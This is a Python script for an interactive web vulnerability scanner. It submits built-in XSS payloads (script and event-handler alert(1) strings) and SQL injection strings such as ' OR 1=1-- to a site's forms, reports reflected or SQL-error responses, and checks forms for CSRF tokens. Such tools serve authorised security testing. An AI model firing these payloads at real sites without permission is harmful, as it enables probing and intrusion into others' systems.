import requests
from bs4 import BeautifulSoup as bs
from colorama import Fore, Style, init
from urllib.parse import urljoin
import re

init(autoreset=True)

# Payloads
xss_payloads = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<object data='javascript:alert(1)'>",
    "<details open ontoggle=alert(1)>",
    "<a href=javascript:alert(1)>Click</a>"
]

sqli_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "admin'--",
    "' OR 1=1#",
    "' OR '1'='1' --",
    """' OR '1'='1' /*"""
]

def get_forms(url):
    try:
        soup = bs(requests.get(url, timeout=10).text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[!] Error fetching forms: {e}")
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = value
        else:
            data[input["name"]] = "test"
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10), target_url, data
        else:
            return requests.get(target_url, params=data, timeout=10), target_url, data
    except Exception as e:
        print(f"[!] Error submitting form: {e}")
        return None, target_url, data

def scan_xss(url):
    print(f"[~] Scanning {url} for XSS...")
    forms = get_forms(url)
    print(f"[+] Found {len(forms)} form(s)")

    mode = input("\nUse default payloads or manual entry? (1=manual / 2=default): ").strip()

    if mode == '1':
        while True:
            print("\nSelect a payload to test:")
            for idx, payload in enumerate(xss_payloads, 1):
                print(f"[{idx}] {Fore.YELLOW}{payload}{Style.RESET_ALL}")
            print("[0] Exit manual payload mode")
            choice = input("Enter payload number: ").strip()

            if choice == '0' or choice.lower() == 'exit':
                break

            if not choice.isdigit() or int(choice) not in range(1, len(xss_payloads)+1):
                print("[!] Invalid choice. Try again.")
                continue

            payload = xss_payloads[int(choice)-1]
            for i, form in enumerate(forms):
                form_details = get_form_details(form)
                res, target_url, sent_data = submit_form(form_details, url, payload)
                if res and payload in res.text:
                    vulnerable_param = next((k for k, v in sent_data.items() if v == payload), "unknown")
                    print(f"\n[Form #{i+1}] Action: {form_details['action']}")
                    print(Fore.RED + "[!!!] XSS Vulnerability Detected!")
                    print(f" ├─ Payload: {Fore.YELLOW}{payload}")
                    print(f" ├─ Parameter: {Fore.CYAN}{vulnerable_param}")
                    print(f" └─ Full Target: {Fore.GREEN}{target_url}?{vulnerable_param}={payload}")
                elif res:
                    print(Fore.GREEN + f"[✓] Not vulnerable with payload: {payload}")
    else:
        for payload in xss_payloads:
            for i, form in enumerate(forms):
                form_details = get_form_details(form)
                res, target_url, sent_data = submit_form(form_details, url, payload)
                if res and payload in res.text:
                    vulnerable_param = next((k for k, v in sent_data.items() if v == payload), "unknown")
                    print(f"\n[Form #{i+1}] Action: {form_details['action']}")
                    print(Fore.RED + "[!!!] XSS Vulnerability Detected!")
                    print(f" ├─ Payload: {Fore.YELLOW}{payload}")
                    print(f" ├─ Parameter: {Fore.CYAN}{vulnerable_param}")
                    print(f" └─ Full Target: {Fore.GREEN}{target_url}?{vulnerable_param}={payload}")
                elif res:
                    print(Fore.GREEN + f"[✓] Not vulnerable with payload: {payload}")

def scan_sqli(url):
    print(f"[~] Scanning {url} for SQL Injection...")
    forms = get_forms(url)
    print(f"[+] Found {len(forms)} form(s)")

    for payload in sqli_payloads:
        print(f"[---] Testing payload: {payload}")
        for i, form in enumerate(forms):
            form_details = get_form_details(form)
            res, target_url, sent_data = submit_form(form_details, url, payload)
            if res and re.search("sql syntax|mysql_fetch|ORA-01756|Unclosed quotation mark", res.text, re.IGNORECASE):
                vulnerable_param = next((k for k, v in sent_data.items() if v == payload), "unknown")
                print(f"\n[Form #{i+1}] Action: {form_details['action']}")
                print(Fore.RED + "[!!!] SQL Injection Vulnerability Detected!")
                print(f" ├─ Payload: {Fore.YELLOW}{payload}")
                print(f" ├─ Parameter: {Fore.CYAN}{vulnerable_param}")
                print(f" └─ Full Target: {Fore.GREEN}{target_url}?{vulnerable_param}={payload}")
            elif res:
                print(Fore.GREEN + f"[✓] Not vulnerable with payload: {payload}")

def scan_csrf(url):
    print(f"[~] Scanning {url} for CSRF tokens...")
    forms = get_forms(url)
    print(f"[+] Found {len(forms)} form(s)")

    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        has_token = any('csrf' in input['name'].lower() for input in form_details['inputs'] if input['name'])
        print(f"[Form #{i+1}] Action: {form_details['action']}")
        if has_token:
            print(Fore.GREEN + "[+] CSRF Token Found")
        else:
            print(Fore.RED + "[!] No CSRF Token Found")

def menu():
    while True:
        print("""
==== Web Vulnerability Scanner ====
[1] Scan for XSS
[2] Scan for SQL Injection
[3] Scan for CSRF
[4] Exit
""")
        choice = input("Enter your choice: ").strip()
        if choice == '1':
            url = input("Enter full URL (e.g., https://testphp.vulnweb.com): ").strip()
            scan_xss(url)
        elif choice == '2':
            url = input("Enter full URL (e.g., https://testphp.vulnweb.com): ").strip()
            scan_sqli(url)
        elif choice == '3':
            url = input("Enter full URL (e.g., https://testphp.vulnweb.com): ").strip()
            scan_csrf(url)
        elif choice == '4':
            print("Exiting...")
            break
        else:
            print("[!] Invalid option. Try again.")

if __name__ == "__main__":
    menu()
